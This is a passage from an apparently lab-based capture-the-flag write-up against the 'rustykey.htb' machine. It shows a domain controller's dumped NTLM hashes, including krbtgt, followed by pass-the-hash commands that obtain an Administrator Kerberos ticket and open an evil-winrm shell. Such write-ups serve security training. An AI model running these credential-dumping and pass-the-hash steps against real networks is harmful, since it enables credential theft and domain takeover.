[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hidden>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
mark_pentester:12104:aad3b435b51404eeaad3b435b51404ee:b17ebf419e79699e47addeeff82aa886:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
```

```bash
❯ impacket-getTGT rustykey.htb/'Administrator' -hashes ":<hidden>"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
 
❯ export KRB5CCNAME=/home/kali/RustyKey/Administrator.ccache                                
❯ evil-winrm -i dc.rustykey.htb -u 'Administrator' -r rustykey.htb 
 
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
rustykey\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

---